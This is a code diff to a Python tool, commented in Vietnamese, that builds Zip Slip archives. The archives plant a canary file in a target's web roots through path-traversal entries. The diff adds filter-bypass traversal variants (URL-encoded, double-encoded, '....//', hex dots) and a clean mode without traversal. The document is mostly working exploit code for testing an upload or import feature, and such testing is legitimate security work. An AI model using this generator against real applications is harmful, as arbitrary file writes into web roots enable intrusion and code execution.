@@ -18,7 +18,14 @@ warnings.filterwarnings("ignore", category=UserWarning, module="zipfile")
 CANARY_FILENAME = "zipslip_probe.txt"
 CANARY_CONTENT  = b"ZIPSLIP_CONFIRMED\n"
 
-TRAVERSAL_PATTERNS = ["../", "..\\", "....//"]
+TRAVERSAL_PATTERNS = [
+    "../",           # chuẩn
+    "..\\",          # Windows separator
+    "..%2F",         # URL encode 1 lần
+    "..%252F",       # URL encode 2 lần
+    "....//",        # bypass filter strip "../"
+    "\x2e\x2e/",    # hex dot
+]
 DEPTHS = list(range(2, 12))  # depth 2 → 11
 
 DEFAULT_WEBROOTS = [
@@ -96,12 +103,15 @@ def build_traversal_entries(webroots: list[str]) -> list[tuple[str, bytes]]:
     return entries
 
 
-def generate(source: str, output: str, webroots: list[str], args_version: str = ""):
+def generate(source: str, output: str, webroots: list[str], args_version: str = "", no_traversal: bool = False):
     source_files = collect_source_files(source)
-    traversal_entries = build_traversal_entries(webroots)
+    traversal_entries = [] if no_traversal else build_traversal_entries(webroots)
 
     print(f"[*] Source files     : {len(source_files)} files từ {source}")
-    print(f"[*] Traversal entries: {len(traversal_entries)} variants")
+    if no_traversal:
+        print(f"[*] Mode             : CLEAN (không có traversal — dùng để test base import)")
+    else:
+        print(f"[*] Traversal entries: {len(traversal_entries)} variants")
     print(f"[*] Output           : {output}\n")
 
     with zipfile.ZipFile(output, "w", zipfile.ZIP_DEFLATED) as zf:
@@ -113,7 +123,9 @@ def generate(source: str, output: str, webroots: list[str], args_version: str = 
                 meta["version"] = args_version
                 data = json.dumps(meta, ensure_ascii=False).encode()
                 print(f"[*] metadata.json version → {args_version}")
-            zf.writestr(zipfile.ZipInfo(arc_name), data)
+            info = zipfile.ZipInfo(arc_name)
+            info.compress_type = zipfile.ZIP_DEFLATED
+            zf.writestr(info, data)
 
         # 2. Thêm entry path traversal
         for arc_name, content in traversal_entries:
@@ -172,6 +184,8 @@ def main():
                         help="Chỉ định 1 web root cụ thể (mặc định thử nhiều path)")
     parser.add_argument("--version", default="2.0.5",
                         help="Version ghi vào metadata.json (default: 2.0.5)")
+    parser.add_argument("--no-traversal", action="store_true",
+                        help="Tạo ZIP sạch không có traversal entries (để test base import)")
     args = parser.parse_args()
 
     is_dir  = os.path.isdir(args.source)
@@ -183,7 +197,8 @@ def main():
 
     print(f"[*] Mode: {'directory' if is_dir else 'zip file'}")
     webroots = [args.webroot] if args.webroot else DEFAULT_WEBROOTS
-    generate(args.source, args.output, webroots, args_version=args.version)
+    no_traversal = getattr(args, 'no_traversal', False)
+    generate(args.source, args.output, webroots, args_version=args.version, no_traversal=no_traversal)
 
 
 if __name__ == "__main__":
